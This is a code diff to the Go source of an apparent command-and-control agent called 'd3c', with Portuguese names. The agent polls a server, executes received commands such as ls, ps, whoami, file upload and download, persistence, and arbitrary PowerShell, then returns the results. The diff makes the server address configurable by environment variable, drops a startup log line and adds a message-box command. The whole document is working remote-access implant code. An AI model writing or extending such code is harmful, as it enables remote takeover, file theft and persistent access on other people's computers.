@@ -9,7 +9,6 @@ import (
 	"d3c/commons/helpers"
 	"d3c/commons/interfaces"
 	"encoding/hex"
-	"log"
 	"os"
 	"os/exec"
 	"runtime"
@@ -20,15 +19,28 @@ var (
 	mensagem estruturas.Mensagem
 )
 
-const (
-	SERVIDOR = "127.0.0.1"
-	PORTA    = "8443"
-	CONEXAO  = "https"
+var (
+	SERVIDOR string
+	PORTA    string
+	CONEXAO  string
 )
 
-func init() {
+func getenvOr(key, fallback string) string {
+	v := os.Getenv(key)
+	if v == "" {
+		return fallback
+	}
+	return v
+}
 
+func init() {
 	EvitaMultiplosAgentes()
+
+	// permite configurar via variáveis de ambiente:
+	// D3C_SERVIDOR, D3C_PORTA, D3C_CONEXAO
+	SERVIDOR = getenvOr("D3C_SERVIDOR", "127.0.0.1")
+	PORTA = getenvOr("D3C_PORTA", "8443")
+	CONEXAO = getenvOr("D3C_CONEXAO", "https")
 
 	mensagem.AgentHostname, _ = os.Hostname()
 	mensagem.AgentCWD, _ = os.Getwd()
@@ -37,7 +49,6 @@ func init() {
 }
 
 func main() {
-	log.Println("Entrei em Execução")
 	for {
 		switch CONEXAO {
 		case "raw":
@@ -48,21 +59,22 @@ func main() {
 			httpsConnector.Execute(SERVIDOR, PORTA, &mensagem)
 		}
 
-		if mensagemContemComandos(mensagem) {
+		if len(mensagem.Comandos) > 0 {
 			for indice, comando := range mensagem.Comandos {
 				comandoId := ValidaComando(helpers.SeparaComando(comando.Comando)[0])
 
 				if comandoId != 0 {
 					mapping := map[int]interfaces.Command{
-						1: commands.Cd{Comando: comando.Comando},
-						2: commands.Ls{Comando: comando.Comando},
-						3: commands.Ps{},
-						4: commands.Pwd{},
-						5: commands.Whoami{},
-						6: commands.Sleep{Comando: comando.Comando, Mensagem: &mensagem},
-						7: commands.Send{Arquivo: comando.Arquivo},
-						8: commands.Get{Comando: comando.Comando, ComandoId: indice, Mensagem: &mensagem},
-						9: commands.Persiste{Comando: comando.Comando},
+						1:  commands.Cd{Comando: comando.Comando},
+						2:  commands.Ls{Comando: comando.Comando},
+						3:  commands.Ps{},
+						4:  commands.Pwd{},
+						5:  commands.Whoami{},
+						6:  commands.Sleep{Comando: comando.Comando, Mensagem: &mensagem},
+						7:  commands.Send{Arquivo: comando.Arquivo},
+						8:  commands.Get{Comando: comando.Comando, ComandoId: indice, Mensagem: &mensagem},
+						9:  commands.Persiste{Comando: comando.Comando},
+						10: commands.Msgbox{},
 					}
 					mensagem.Comandos[indice].Resposta = mapping[comandoId].Executar()
 				} else {
@@ -72,37 +84,20 @@ func main() {
 		}
 		time.Sleep(time.Duration(mensagem.TempoEspera) * time.Second)
 	}
-
 }
 
 func executaComandoEmShell(comandoCompleto string) (resposta string) {
-
-	if (runtime.GOOS) == "windows" {
-		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
-
+	if runtime.GOOS == "windows" {
+		output, _ := exec.Command("powershell.exe", "-Command", comandoCompleto).CombinedOutput()
 		resposta = string(output)
 	} else {
 		resposta = "Sistema operacional alvo nao implementado para acesso ao shell."
 	}
-
-	return resposta
-}
-
-func mensagemContemComandos(mensagemDoServidor estruturas.Mensagem) (contem bool) {
-	contem = false
-
-	if len(mensagemDoServidor.Comandos) > 0 {
-		contem = true
-	}
-
-	return contem
+	return
 }
 
 func geraID() string {
-	myTime := time.Now().String()
-
 	hasher := md5.New()
-	hasher.Write([]byte(mensagem.AgentHostname + myTime))
-
+	hasher.Write([]byte(mensagem.AgentHostname + time.Now().String()))
 	return hex.EncodeToString(hasher.Sum(nil))
 }
